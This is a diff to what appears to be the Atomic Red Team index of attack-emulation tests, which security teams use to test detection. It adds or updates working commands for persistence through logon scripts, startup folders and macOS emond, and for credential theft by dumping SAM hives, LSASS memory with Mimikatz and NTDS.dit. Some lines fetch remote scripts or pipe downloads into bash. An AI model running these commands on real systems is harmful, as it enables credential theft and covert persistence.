@@ -1043,7 +1043,7 @@ persistence:
           1. Navigate to [about:debugging](about:debugging) and
           click "Load Temporary Add-on"
 
-          2. Navigate to [manifest.json](./manifest.json)
+          2. Navigate to [manifest.json](./src/manifest.json)
 
           3. Then click 'Open'
   T1042:
@@ -2849,44 +2849,61 @@ persistence:
       identifier: T1037
     atomic_tests:
     - name: Logon Scripts
-      description: 'Added Via Reg.exe
+      description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
+        directory.
 
 '
       supported_platforms:
       - windows
       input_arguments:
+        script_path:
+          description: Path to .bat file
+          type: String
+          default: "$env:SystemRoot\\Temp\\art.bat"
         script_command:
           description: Command To Execute
           type: String
-          default: cmd.exe /c calc.exe
+          default: echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037-log.txt
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
-          /d "#{script_command}"
-
-'
-        cleanup_command: 'REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript
-          /f
-
-'
-    - name: Starup Folder Script
-      description: 'A batch file on startup when placed in the start menu folder
+        command: |
+          echo cmd /c "#{script_command}" > #{script_path}
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
+        cleanup_command: |
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
+          del #{script_path}
+          del "%USERPROFILE%\desktop\T1037-log.txt"
+    - name: Startup Folder Script
+      description: 'A batch file created to run on startup when placed in the start
+        menu folder
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        user_command:
+          description: Path to .bat file
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:USERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
+        system_command:
+          description: Command To Execute
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:COMPUTERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
-          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
+          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{user_command}"
+          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{system_command}"
         cleanup_command: |
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
           Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
+          Remove-Item "$env:USERPROFILE\desktop\T1037-log.txt"
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
@@ -4663,32 +4680,37 @@ persistence:
       modified: '2019-07-18T17:58:17.016Z'
       identifier: T1165
     atomic_tests:
-    - name: Startup Items
+    - name: add file to Local Library StartupItems
       description: |
-        Modify or create an file in StartupItems
+        Modify or create an file in /Library/StartupItems
 
         [Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)
       supported_platforms:
       - macos
       executor:
-        name: manual
-        steps: '1. /Library/StartupItems/StartupParameters.plist
+        name: sh
+        elevation_required: true
+        command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
 '
-    - name: Startup Items (emond rule)
-      description: 'Establish persistence via a rule run by emond daemon at startup,
-        based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
+        cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
+
+'
+    - name: Persistance with Event Monitor - emond
+      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
+        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
 '
       supported_platforms:
       - macos
       input_arguments:
         plist:
-          description: Path to emond plist file
+          description: Path to attacker emond plist file
           type: path
-          default: "/path/to/T1165_emond.plist"
+          default: "$PathToAtomics/T1165/src/T1165_emond.plist"
       executor:
         name: sh
+        elevation_required: true
         command: |
           sudo cp "#{plist}" /etc/emond.d/rules/T1165_emond.plist
           sudo touch /private/var/db/emondClients/T1165
@@ -4914,15 +4936,13 @@ persistence:
         After sending a keyboard interrupt (CTRL+C) the script will download and execute.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
   T1100:
     technique:
       x_mitre_data_sources:
@@ -7514,6 +7534,86 @@ defense-evasion:
           -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
 
 '
+  T1006:
+    technique:
+      x_mitre_data_sources:
+      - API monitoring
+      x_mitre_permissions_required:
+      - Administrator
+      name: File System Logical Offsets
+      description: |-
+        Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)
+
+        Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)
+      id: attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      x_mitre_detection: |-
+        Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)
+
+        Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1086), additional logging of PowerShell scripts is recommended.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      created: '2017-05-31T21:30:20.934Z'
+      modified: '2018-10-17T00:14:20.652Z'
+      external_references:
+      - external_id: T1006
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1006
+      - description: Hakobyan, A. (2009, January 8). FDump - Dumping File Sectors
+          Directly from Disk using Logical Offsets. Retrieved November 12, 2014.
+        source_name: Hakobyan 2009
+        url: http://www.codeproject.com/Articles/32169/FDump-Dumping-File-Sectors-Directly-from-Disk-usin
+      - description: Bialek, J. (2015, December 16). Invoke-NinjaCopy.ps1. Retrieved
+          June 2, 2016.
+        source_name: Github PowerSploit Ninjacopy
+        url: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1
+      x_mitre_defense_bypassed:
+      - File monitoring
+      - File system access controls
+      identifier: T1006
+    atomic_tests:
+    - name: File System Logical Offsets using PowerShell
+      description: |
+        This test uses PowerShell to copy files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+        Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        sam_binary_path:
+          description: Path of the SAM file
+          type: string
+          default: C:\Windows\System32\config\sam
+        system_binary_path:
+          description: Path of the SYSTEM file
+          type: string
+          default: C:\Windows\System32\config\system
+        security_binary_path:
+          description: Path of the SECURITY file
+          type: string
+          default: C:\Windows\System32\config\security
+        output_folder:
+          description: Output folder path
+          type: Path
+          default: C:\Windows\Temp
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          . $PathToAtomicsFolder\T1006\src\Invoke-NinjaCopy.ps1
+          Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
+          Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
+          Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
+        cleanup_command: |-
+          rm "#{output_folder}\sam"
+          rm "#{output_folder}\system"
+          rm "#{output_folder}\security"
   T1222:
     technique:
       x_mitre_data_sources:
@@ -9790,15 +9890,10 @@ defense-evasion:
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
       supported_platforms:
       - windows
-      input_arguments:
-        atomics_path:
-          description: path to atomics folder
-          type: path
-          default: "..\\..\\atomics"
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
@@ -11689,7 +11784,7 @@ defense-evasion:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -11734,7 +11829,9 @@ defense-evasion:
         command: |
           set comspec=#{command_to_execute}
           cscript manage-bde.wsf
-        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
+        cleanup_command: 'set comspec=C:\Windows\System32\cmd.exe
+
+'
   T1151:
     technique:
       x_mitre_data_sources:
@@ -12140,7 +12237,7 @@ defense-evasion:
         filename:
           description: Location of the project file
           type: Path
-          default: PathToAtomicsFolder\T1127\T1127.csproj
+          default: PathToAtomicsFolder\T1127\src\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -15042,32 +15139,37 @@ privilege-escalation:
       modified: '2019-07-18T17:58:17.016Z'
       identifier: T1165
     atomic_tests:
-    - name: Startup Items
+    - name: add file to Local Library StartupItems
       description: |
-        Modify or create an file in StartupItems
+        Modify or create an file in /Library/StartupItems
 
         [Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)
       supported_platforms:
       - macos
       executor:
-        name: manual
-        steps: '1. /Library/StartupItems/StartupParameters.plist
+        name: sh
+        elevation_required: true
+        command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
 '
-    - name: Startup Items (emond rule)
-      description: 'Establish persistence via a rule run by emond daemon at startup,
-        based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
+        cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
+
+'
+    - name: Persistance with Event Monitor - emond
+      description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
+        daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
 '
       supported_platforms:
       - macos
       input_arguments:
         plist:
-          description: Path to emond plist file
+          description: Path to attacker emond plist file
           type: path
-          default: "/path/to/T1165_emond.plist"
+          default: "$PathToAtomics/T1165/src/T1165_emond.plist"
       executor:
         name: sh
+        elevation_required: true
         command: |
           sudo cp "#{plist}" /etc/emond.d/rules/T1165_emond.plist
           sudo touch /private/var/db/emondClients/T1165
@@ -19335,7 +19437,7 @@ credential-access:
         remote_script:
           description: URL to a remote Mimikatz script that dumps credentials
           type: Url
-          default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
       executor:
         name: powershell
         elevation_required: true
@@ -19378,17 +19480,22 @@ credential-access:
         via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
       supported_platforms:
       - windows
+      input_arguments:
+        output_folder:
+          description: Output folder path
+          type: Path
+          default: C:\Windows\Temp
       executor:
         name: command_prompt
         elevation_required: true
         command: |
-          reg save HKLM\sam sam
-          reg save HKLM\system system
-          reg save HKLM\security security
+          reg save HKLM\sam "#{output_folder}\sam"
+          reg save HKLM\system "#{output_folder}\system"
+          reg save HKLM\security "#{output_folder}\security"
         cleanup_command: |
-          rm sam
-          rm system
-          rm security
+          rm "#{output_folder}\sam"
+          rm "#{output_folder}\system"
+          rm "#{output_folder}\security"
     - name: Dump LSASS.exe Memory using ProcDump
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
@@ -19396,14 +19503,19 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
+        procdump_binary_path:
+          description: Path of the ProcDump binary
+          type: string
+          default: "$PathToAtomicsFolder\\T1003\\bin\\procdump64.exe"
         output_file:
           description: Path where resulting dump should be placed
           type: Path
-          default: lsass_dump.dmp
+          default: C:\Windows\Temp\lsass_dump.dmp
       executor:
         elevation_required: true
         name: command_prompt
-        command: 'procdump.exe -accepteula -ma lsass.exe #{output_file}
+        command: "#{procdump_binary_path} -accepteula -ma lsass.exe #{output_file}\n"
+        cleanup_command: 'rm "#{output_file}"
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
@@ -19432,21 +19544,21 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
+        mimikatz_binary_path:
+          description: Path of the Mimikatz binary
+          type: string
+          default: "$PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe"
         input_file:
-          description: Path where resulting dump should be placed
+          description: Path of the Lsass dump
           type: Path
-          default: lsass_dump.dmp
+          default: C:\Windows\Temp\lsass_dump.dmp
       executor:
-        name: manual
-        steps: |
-          1. Open Mimikatz:
-            Execute `mimikatz` at a command prompt.
+        name: command_prompt
+        elevation_required: true
+        command: '#{mimikatz_binary_path} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords
+          full" exit
 
-          2. Select a Memory Dump:
-            Within the Mimikatz interactive shell, execute `sekurlsa::minidump #{input_file}`
-
-          3. Obtain Credentials:
-            Within the Mimikatz interactive shell, execute `sekurlsa::logonpasswords full`
+'
     - name: Dump Active Directory Database with NTDSUtil
       description: |
         The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
@@ -19458,7 +19570,7 @@ credential-access:
         output_folder:
           description: Path where resulting dump should be placed
           type: Path
-          default: C:\Atomic_Red_Team
+          default: C:\Windows\Temp
       executor:
         name: command_prompt
         elevation_required: true
@@ -19499,7 +19611,7 @@ credential-access:
         extract_path:
           description: Path for extracted NTDS.dit
           type: Path
-          default: C:\Extract
+          default: C:\Windows\Temp
       executor:
         name: command_prompt
         elevation_required: true
@@ -19507,6 +19619,10 @@ credential-access:
           copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
           copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
           reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
+        cleanup_command: |
+          rm "#{extract_path}\ntds.dit"
+          rm "#{extract_path}\VSC_SYSTEM_HIVE"
+          rm "#{extract_path}\SYSTEM_HIVE"
     - name: GPP Passwords (findstr)
       description: 'Look for the encrypted cpassword value within Group Policy Preference
         files on the Domain Controller. This value can be decrypted with gpp-decrypt
@@ -19539,6 +19655,41 @@ credential-access:
         command: |
           . #{gpp_script_path}
           Get-GPPPassword -Verbose
+    - name: Dump SAM, SECURITY and SYSTEM files using NinjaCopy PowerShell script
+      description: |
+        This test uses PowerShell to copy SAM, SECURITY and SYSTEM files from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures.
+        Credit to Joe Bialek (https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        sam_binary_path:
+          description: Path of the SAM file
+          type: string
+          default: C:\Windows\System32\config\sam
+        system_binary_path:
+          description: Path of the SYSTEM file
+          type: string
+          default: C:\Windows\System32\config\system
+        security_binary_path:
+          description: Path of the SECURITY file
+          type: string
+          default: C:\Windows\System32\config\security
+        output_folder:
+          description: Output folder path
+          type: Path
+          default: C:\Windows\Temp
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
+          Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
+          Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
+          Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
+        cleanup_command: |-
+          rm "#{output_folder}\sam"
+          rm "#{output_folder}\system"
+          rm "#{output_folder}\security"
   T1081:
     technique:
       x_mitre_permissions_required:
@@ -21587,15 +21738,10 @@ execution:
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
       supported_platforms:
       - windows
-      input_arguments:
-        atomics_path:
-          description: path to atomics folder
-          type: path
-          default: "..\\..\\atomics"
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
@@ -23054,7 +23200,7 @@ execution:
         remote_payload:
           description: A remote payload to execute using PubPrn.vbs.
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -23099,7 +23245,9 @@ execution:
         command: |
           set comspec=#{command_to_execute}
           cscript manage-bde.wsf
-        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
+        cleanup_command: 'set comspec=C:\Windows\System32\cmd.exe
+
+'
   T1153:
     technique:
       x_mitre_data_sources:
@@ -23296,15 +23444,13 @@ execution:
         After sending a keyboard interrupt (CTRL+C) the script will download and execute.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         command: |
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' EXIT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" EXIT
           exit
-          trap 'nohup curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh | bash' INT
+          trap "nohup $PathToAtomicsFolder/T1154/src/echo-art-fish.sh | bash" SIGINt
   T1127:
     technique:
       x_mitre_data_sources:
@@ -23444,7 +23590,7 @@ execution:
         filename:
           description: Location of the project file
           type: Path
-          default: PathToAtomicsFolder\T1127\T1127.csproj
+          default: PathToAtomicsFolder\T1127\src\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -24131,44 +24277,61 @@ lateral-movement:
       identifier: T1037
     atomic_tests:
     - name: Logon Scripts
-      description: 'Added Via Reg.exe
+      description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
+        directory.
 
 '
       supported_platforms:
       - windows
       input_arguments:
+        script_path:
+          description: Path to .bat file
+          type: String
+          default: "$env:SystemRoot\\Temp\\art.bat"
         script_command:
           description: Command To Execute
           type: String
-          default: cmd.exe /c calc.exe
+          default: echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037-log.txt
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
-          /d "#{script_command}"
-
-'
-        cleanup_command: 'REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript
-          /f
-
-'
-    - name: Starup Folder Script
-      description: 'A batch file on startup when placed in the start menu folder
+        command: |
+          echo cmd /c "#{script_command}" > #{script_path}
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
+        cleanup_command: |
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
+          del #{script_path}
+          del "%USERPROFILE%\desktop\T1037-log.txt"
+    - name: Startup Folder Script
+      description: 'A batch file created to run on startup when placed in the start
+        menu folder
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        user_command:
+          description: Path to .bat file
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:USERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
+        system_command:
+          description: Command To Execute
+          type: String
+          default: echo Art `"Startup Folder Script`" atomic test for $env:COMPUTERNAME
+            was successful. >> $env:USERPROFILE\desktop\T1037-log.txt
       executor:
         name: powershell
-        elevation_required: false
+        elevation_required: true
         command: |
-          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
-          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
-          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "echo T1037"
+          New-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{user_command}"
+          New-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" -force
+          Set-Content "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat" "cmd /c #{system_command}"
         cleanup_command: |
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
           Remove-Item "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1037.bat"
+          Remove-Item "$env:USERPROFILE\desktop\T1037-log.txt"
     - name: Scheduled Task Startup Script
       description: 'Run an exe on user logon or system startup
 
@@ -26052,7 +26215,7 @@ exfiltration:
         prereq_command: 'rar /?
 
 '
-        command: 'rar a -r #{output_file} #{input_path}*#{file_extension}
+        command: 'rar a -r #{output_file} #{input_path} *#{file_extension}
 
 '
         cleanup_command: del -f
@@ -26138,7 +26301,9 @@ exfiltration:
         command: 'tar -cvzf #{output_file} #{input_file_folder}
 
 '
-        cleanup_command: 'rm -f #{output_file}'
+        cleanup_command: 'rm -f #{output_file}
+
+'
   T1022:
     technique:
       x_mitre_data_sources:
@@ -26194,27 +26359,30 @@ exfiltration:
       modified: '2018-10-17T00:14:20.652Z'
       identifier: T1022
     atomic_tests:
-    - name: Data Encrypted with zip and gpg
+    - name: Data Encrypted with zip and gpg symmetric
       description: 'Encrypt data for exiltration
 
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
         elevation_required: false
+        prereq_command: which gpg
         command: |
-          echo "This file will be encrypted" > /tmp/victim-gpg.txt
-          mkdir PathToAtomicsFolder/T1022/victim-files
+          mkdir /tmp/victim-files
           cd /tmp/victim-files
           touch a b c d e f g
-          zip --password "insert password here" $PathToAtomicsFolder/victim-files.zip /tmp/victim-files/*
-          gpg -c $PathToAtomicsFolder/T1022/victim-gpg.txt
-          <enter passphrase and confirm>
+          echo "creating zip with password 'insert password here'"
+          zip --password "insert password here" ./victim-files.zip ./*
+          echo "encrypting file with gpg, you will need to provide a password"
+          gpg -c /tmp/victim-files/victim-filex.zip
+          #<enter passphrase and confirm>
           ls -l
+        cleanup_command: 'rm -Rf /tmp/victim-files
+
+'
     - name: Compress Data and lock with password for Exfiltration with winrar
       description: |
         Note: Requires winrar installation
@@ -26482,7 +26650,7 @@ exfiltration:
         ip_address:
           description: Destination IP address where the data should be sent.
           type: String
-          default: 1.1.1.1
+          default: 127.0.0.1
       executor:
         name: powershell
         elevation_required: false
